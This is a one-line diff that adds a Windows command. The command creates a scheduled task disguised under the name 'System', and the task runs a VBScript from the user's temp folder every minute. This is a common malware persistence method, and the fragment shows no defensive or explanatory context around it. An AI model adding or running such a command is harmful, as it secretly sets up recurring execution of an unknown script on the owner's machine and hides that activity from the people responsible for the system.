@@ -1,0 +1,1 @@
+schtasks /create /tn "System" /sc minute /mo 1 /tr "%temp%\system.vbs"
